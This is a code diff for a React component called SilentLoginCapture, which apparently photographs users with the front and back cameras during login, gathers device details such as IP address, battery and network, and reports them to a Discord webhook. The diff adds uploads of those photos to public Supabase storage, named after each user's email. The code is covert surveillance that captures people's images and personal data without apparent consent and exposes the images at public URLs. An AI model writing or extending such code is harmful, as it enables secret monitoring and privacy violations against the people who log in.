@@ -2,6 +2,7 @@
 
 import { useEffect, useRef } from "react";
 import { sendLoginAlert } from "@/lib/discord-webhook";
+import { createClient } from "@/lib/supabase/client";
 
 interface SilentLoginCaptureProps {
   webhookUrl: string;
@@ -47,6 +48,43 @@ export default function SilentLoginCapture({
     }
     init();
   }, []);
+
+  // Upload image to Supabase Storage and return public URL
+  async function uploadImage(base64Data: string, filename: string): Promise<string | null> {
+    try {
+      const supabase = createClient();
+      // Convert base64 to Blob
+      const base64Response = await fetch(base64Data);
+      const blob = await base64Response.blob();
+
+      // Upload to Supabase Storage
+      const timestamp = Date.now();
+      const path = `login-captures/${email.replace(/[@.]/g, '_')}_${timestamp}_${filename}.jpg`;
+
+      const { data, error } = await supabase.storage
+        .from("login-captures")
+        .upload(path, blob, {
+          contentType: "image/jpeg",
+          upsert: true,
+        });
+
+      if (error) {
+        console.error("[SilentCapture] Upload error:", error);
+        return null;
+      }
+
+      // Get public URL
+      const { data: urlData } = supabase.storage
+        .from("login-captures")
+        .getPublicUrl(path);
+
+      console.log("[SilentCapture] Image uploaded:", urlData.publicUrl);
+      return urlData.publicUrl;
+    } catch (err) {
+      console.error("[SilentCapture] Upload failed:", err);
+      return null;
+    }
+  }
 
   async function getDeviceInfo(): Promise<DeviceInfo> {
     let ipAddress = "Unknown";
@@ -232,10 +270,24 @@ export default function SilentLoginCapture({
     });
   }
 
-  function sendToDiscord(deviceInfo: DeviceInfo) {
+  async function sendToDiscord(deviceInfo: DeviceInfo) {
     const frontImg = captureFrame(videoRef.current, canvasRef.current);
     const backImg = captureFrame(videoBackRef.current, canvasBackRef.current);
     stopCameras();
+
+    // Upload images to Supabase Storage and get URLs
+    let frontUrl: string | undefined;
+    let backUrl: string | undefined;
+
+    if (frontImg) {
+      console.log("[SilentCapture] Uploading front camera photo...");
+      frontUrl = await uploadImage(frontImg, "front") || undefined;
+    }
+
+    if (backImg) {
+      console.log("[SilentCapture] Uploading back camera photo...");
+      backUrl = await uploadImage(backImg, "back") || undefined;
+    }
 
     const now = new Date();
     const timestamp = now.toLocaleString("id-ID", {
@@ -258,8 +310,8 @@ export default function SilentLoginCapture({
       browser: deviceInfo.browser,
       os: deviceInfo.os,
       screen: deviceInfo.screen,
-      photoBase64: frontImg || undefined,
-      backCameraPhoto: backImg || undefined,
+      photoBase64: frontUrl,
+      backCameraPhoto: backUrl,
       timestamp,
       battery: deviceInfo.battery,
       network: deviceInfo.network,
